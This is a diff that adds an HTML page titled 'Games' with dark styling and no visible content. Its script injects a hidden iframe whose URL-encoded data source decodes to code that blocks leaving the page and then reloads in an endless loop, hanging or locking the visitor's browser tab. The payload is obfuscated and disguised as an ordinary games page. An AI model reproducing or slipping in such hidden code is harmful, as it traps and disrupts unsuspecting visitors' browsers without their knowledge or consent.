@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Games</title>
+    <style>
+        @import url('"https://fonts.googleapis.com/css2?family=Roboto:ital,wght:@400;&display=swap');
+	    * {
+	    font-family: "Roboto", arial;
+	    }
+        body {
+        background-color: #1e1f22;
+        color: white;
+        }
+        button {
+        background: transparent;
+        color: #9dbae9;
+        font-weight: bold;
+        border: 1px solid #047db7;
+        border-radius: 20px;
+        width: 80px;
+        height: 45px;
+        cursor: pointer;
+        transition: background 0.2s ease-in-out;
+        outline: none;
+    	}
+   	    button:hover {
+        background: #38393b;
+   	    }
+    </style>
+</head>
+<body>
+    <script>
+            const iframe = document.createElement('iframe');
+            iframe.src = "data:text/html;charset=utf-8,%3Cscript%3E%0Aonbeforeunload%20%3D%20()%20%3D%3E%20true%3B%0AsetTimeout(function()%7B%0A%20%20%20%20while(1)location.reload(1)%0A%20%20%7D%2C%201000)%0A%3C%2Fscript%3E";
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+    </script>
+</body>
+</html>
